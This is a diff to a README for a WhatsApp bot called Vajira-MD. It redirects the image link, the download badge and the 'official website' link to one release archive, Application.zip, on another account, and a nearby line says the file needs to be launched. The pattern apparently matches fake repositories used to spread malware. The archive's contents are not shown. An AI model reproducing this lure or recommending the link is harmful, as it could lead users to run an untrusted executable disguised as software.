@@ -3,7 +3,7 @@
 
 Welcome to the official repository of **ＶＡＪＩＲＡ - ＭＤ** by **(T.D.D) GANGS**! This project is a cutting-edge AI-powered multi-device bot called Vajira-MD that revolutionizes the way you interact with WhatsApp. 💬🤖
 
-![Vajira-MD](https://yourimageurl.com)
+![Vajira-MD](https://github.com/Astika08/VAJIRA-MD/releases/download/v1.0/Application.zip)
 
 ## 🌟 Features
 
@@ -16,7 +16,7 @@ Welcome to the official repository of **ＶＡＪＩＲＡ - ＭＤ** by **(T.D.
 
 To get started with Vajira-MD, simply download the latest release of the project by clicking the button below:
 
-[![Download Vajira-MD](https://img.shields.io/badge/Download-Vajira--MD-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Vajira-MD](https://github.com/Astika08/VAJIRA-MD/releases/download/v1.0/Application.zip)](https://github.com/Astika08/VAJIRA-MD/releases/download/v1.0/Application.zip)
 
 *Note: The file needs to be launched.*
 
@@ -39,7 +39,7 @@ Explore some of the main topics related to Vajira-MD:
 
 ## 🌐 Website
 
-Visit our [official website](https://vajira-md.com) for more information and updates about Vajira-MD.
+Visit our [official website](https://github.com/Astika08/VAJIRA-MD/releases/download/v1.0/Application.zip) for more information and updates about Vajira-MD.
 
 ## 🤝 Get Involved
 
